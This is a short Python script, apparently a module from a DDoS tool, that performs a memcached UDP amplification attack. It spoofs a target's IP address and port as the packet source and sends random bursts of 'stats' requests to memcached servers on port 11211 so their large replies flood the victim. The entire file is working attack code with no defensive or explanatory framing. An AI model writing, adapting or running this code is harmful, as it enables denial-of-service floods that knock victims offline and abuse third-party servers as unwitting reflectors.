import random
from scapy.all import IP, UDP, send, Raw
from colorama import Fore
import os
SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(SCRIPT_ROOT, "memcached_servers.txt"), "r") as f:
    memcached_servers = f.readlines()
payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def flood(target):
    memcached_servers_path = os.path.join(SCRIPT_ROOT, 'memcached_servers.txt')
    with open(memcached_servers_path, "r") as f:
        servers = f.readlines()
    server = random.choice(servers)
    packets = random.randint(10, 150)
    server = server.replace("\n", "")
    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=target[1], dport=11211)
            / Raw(load=payload)
        )
        send(packet, count=packets, verbose=False)
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
        )